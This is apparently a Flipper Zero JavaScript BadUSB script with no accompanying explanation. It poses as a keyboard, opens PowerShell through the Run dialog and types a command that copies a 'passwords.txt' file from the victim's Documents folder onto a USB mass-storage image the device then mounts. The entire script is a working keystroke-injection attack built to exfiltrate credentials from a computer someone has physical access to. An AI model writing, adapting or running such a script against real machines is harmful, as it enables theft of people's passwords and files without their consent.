let OUTPUT_NAME = "passwords.txt";
let DELAY = 1000;
let BADUSB_CONNECT_DELAY = 1000;
let PRINT_DELAY = 50;
let WAIT_FOR_DRIVE_DELAY = 5;

let badusb = require("badusb");
let dialog = require("dialog");
let usbdisk = require("usbdisk");

let path = dialog.pickFile("/ext/apps_data/mass_storage", ".img");

badusb.setup();

while (!badusb.isConnected()) {
  delay(BADUSB_CONNECT_DELAY);
}

badusb.press("GUI", "r");
delay(DELAY);

badusb.print("powershell", PRINT_DELAY);
delay(DELAY);

badusb.press("ENTER");
delay(DELAY);

badusb.print("$fileName = \"" + OUTPUT_NAME + "\"; while (-not (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 })) { Start-Sleep -Seconds " + to_string(WAIT_FOR_DRIVE_DELAY) + " }; $usbDrive = (Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }).DeviceID; $targetPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::MyDocuments), $fileName); Copy-Item -Path $targetPath -Destination \"$usbDrive\$fileName\" -Force; exit", PRINT_DELAY);
delay(DELAY);

badusb.press("ENTER");
delay(DELAY);

badusb.quit();
delay(DELAY);

usbdisk.start(path);
delay(WAIT_FOR_DRIVE_DELAY * 3000);
usbdisk.stop();
